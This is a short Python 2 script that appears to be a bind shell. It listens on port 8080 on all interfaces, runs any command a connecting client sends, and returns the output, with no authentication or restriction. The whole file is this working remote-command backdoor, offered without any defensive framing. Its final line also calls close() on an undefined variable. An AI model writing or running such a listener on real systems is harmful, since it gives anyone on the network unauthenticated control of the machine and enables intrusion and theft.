#!/usr/bin/python2

import socket, select, subprocess

#create the listener socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(('', 8080))

#allow up to 10 connection requests to be queued
listener.listen(10)

# put the socket in the list as input to the select command.
# this list will be expanded as connections come in.
allsocks = [listener]

# loop to accept and service incoming connections
while True:
	# select waits on list of sockets and returns a list of the ones that are ready
	ready, output, exceptions = select.select(allsocks, [], [])

	#now we can process the sockets that are ready
	for sock in ready: 
		# if it is the listener, create a new socket by accepting
		if sock == listener:
			conn, addr = listener.accept()
			print "New connection from: ", addr
			allsocks.append(conn)
		else:
			# previously accepted socket, recieve the command
			commstr = sock.recv(1024)
			if commstr:
				commlist = commstr.rstrip().split(" ")
				print "Recieved command: ", commlist
				if commlist[0] == "exit":
					sock.close()
					allsocks.remove(sock)

				else:
					try:
						child = subprocess.Popen(commlist, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
						out, err = child.communicate()

					except OSError: 
						out = "Command failed\n"
						sock.send(out)
					else:
						sock.send(out + err)
					
s.close()
